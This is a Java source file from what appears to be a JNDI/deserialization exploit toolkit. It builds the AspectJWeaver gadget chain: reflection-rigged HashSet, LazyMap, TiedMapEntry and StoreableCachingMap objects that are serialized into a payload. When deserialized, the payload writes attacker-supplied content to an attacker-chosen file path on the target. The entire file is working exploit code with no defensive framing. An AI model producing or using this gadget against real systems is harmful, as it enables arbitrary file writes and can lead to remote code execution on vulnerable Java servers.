package sonomon.jndi.deser.gadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import sonomon.jndi.factory.FactoryUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;

public class Aspectjweaver implements SerializeObject {
	
	public Object getJavaSerializeObject(String pathcontent, String jarname) throws Exception {
		List list;
		String path = null;
		byte[] content = null;
		try {
	        list = Arrays.asList(pathcontent.split("\\:"));
	        path = (String) list.get(0);
	        content = ((String) list.get(1)).getBytes();
		} catch (Exception e) {
			System.out.println("[-] ajw参数错误: "+pathcontent+" 参考../ahi.txt:ahihihi\r\n");
		}
        Constructor ctor = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        Object simpleCache = ctor.newInstance(".", 12);
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, path);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, entry);
        return map;
    }

	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}
